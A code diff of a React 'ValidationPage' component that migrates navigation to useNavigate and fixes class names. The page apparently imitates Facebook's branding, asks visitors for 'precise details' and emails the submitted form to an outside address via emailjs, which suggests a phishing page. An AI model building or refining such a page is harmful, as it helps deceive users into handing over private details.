@@ -1,12 +1,12 @@
 import React, { useState, useRef } from "react";
-import { useHistory } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
 import emailjs from "@emailjs/browser";
 import FacebookVideo from "../assets/fbVideo.png";
 import "./style.css";
 
 const ValidationPage = () => {
   const form = useRef();
-  const history = useHistory(); // Use useHistory hook for navigation
+  const navigate = useNavigate(); // Use useNavigate hook for navigation
   const [isFormValid, setIsFormValid] = useState(false);
 
   const sendEmail = (e) => {
@@ -36,7 +36,7 @@ const ValidationPage = () => {
         .then(
           (result) => {
             console.log("result text is", result.text);
-            history.push("/thanks"); // Navigate to ThanksPage
+            navigate("/thanks"); // Navigate to ThanksPage
           },
           (error) => {
             console.log(error.text);
@@ -52,7 +52,7 @@ const ValidationPage = () => {
     <>
       <form ref={form} onSubmit={sendEmail}>
         <div
-          className="d-flex align -items-center"
+          className="d-flex align-items-center"
           style={{ width: "100%", height: "90px", background: "#4667AC" }}
         >
           <h1 className="text-white ms-4 m-0 d-flex align-self-center">
@@ -61,7 +61,7 @@ const ValidationPage = () => {
         </div>
 
         <div
-          className="d-flex align -items-center"
+          className="d-flex align-items-center"
           style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
         >
           <h4 className="ms-4 m-0 d-flex align-self-center text-primary">
@@ -95,7 +95,7 @@ const ValidationPage = () => {
               </p>
               <p className="fw-semibold validation_form_para">
                 Please provide the precise details below. Refer to the video for
-                clarification if you find the instructions unclear.{" "}
+                clarification if you find the instructions unclear.
               </p>
               <p
                 className="fw-semibold text-secondary"
